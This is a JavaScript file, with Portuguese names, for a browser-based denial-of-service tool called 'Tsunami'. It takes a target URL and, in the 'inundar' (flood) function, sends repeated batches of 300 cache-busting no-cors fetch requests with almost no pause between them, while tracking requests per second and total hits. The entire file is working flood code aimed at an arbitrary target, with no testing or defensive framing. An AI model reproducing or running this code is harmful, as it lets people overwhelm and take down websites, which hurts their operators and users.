let ativo = false;
let requisicoesNoSegundo = 0;
let totalAcumulado = 0;
let segundosPassados = 0;
let intervaloTempo;

function log(msg) {
    const logBox = document.getElementById('log');
    logBox.innerHTML += `<br>> ${msg}`;
    logBox.scrollTop = logBox.scrollHeight;
}

function formatarTempo(s) {
    const min = Math.floor(s / 60).toString().padStart(2, '0');
    const seg = (s % 60).toString().padStart(2, '0');
    return `${min}:${seg}`;
}

async function toggleTsunami() {
    const alvo = document.getElementById('target').value;
    const btn = document.getElementById('btn-main');

    if (!alvo) {
        log("<span class='warning'>ERRO: Alvo não definido!</span>");
        return;
    }

    ativo = !ativo;

    if (ativo) {
        // Reset e Início
        totalAcumulado = 0;
        segundosPassados = 0;
        document.getElementById('total-hits').innerHTML = "0";
        document.getElementById('timer').innerHTML = "00:00";
        
        btn.innerHTML = "Parar Onda";
        btn.style.background = "#ff0000";
        document.getElementById('engine-status').innerHTML = "RUNNING";
        document.getElementById('engine-status').style.color = "#ff0000";
        
        log(`ALVO TRAVADO: ${alvo}`);
        
        // Inicia o cronômetro
        intervaloTempo = setInterval(() => {
            segundosPassados++;
            document.getElementById('timer').innerHTML = formatarTempo(segundosPassados);
            
            // Atualiza RPS e limpa para o próximo segundo
            document.getElementById('rps').innerHTML = requisicoesNoSegundo;
            requisicoesNoSegundo = 0;
        }, 1000);

        inundar(alvo);
    } else {
        // Parar
        btn.innerHTML = "Iniciar Onda";
        btn.style.background = "#00ffff";
        document.getElementById('engine-status').innerHTML = "IDLE";
        document.getElementById('engine-status').style.color = "#00ffff";
        clearInterval(intervaloTempo);
        log("ONDA ENCERRADA.");
    }
}

async function inundar(url) {
    while (ativo) {
        const lote = 300;
        const disparos = Array.from({ length: lote }, () => 
            fetch(`${url}?t=${Math.random()}`, { mode: 'no-cors', cache: 'no-store' })
                .then(() => { 
                    requisicoesNoSegundo++; 
                    totalAcumulado++; 
                    document.getElementById('total-hits').innerHTML = totalAcumulado;
                })
                .catch(() => { 
                    requisicoesNoSegundo++; 
                    totalAcumulado++; 
                    document.getElementById('total-hits').innerHTML = totalAcumulado;
                })
        );

        await Promise.allSettled(disparos);
        await new Promise(r => setTimeout(r, 10)); 
    }
}
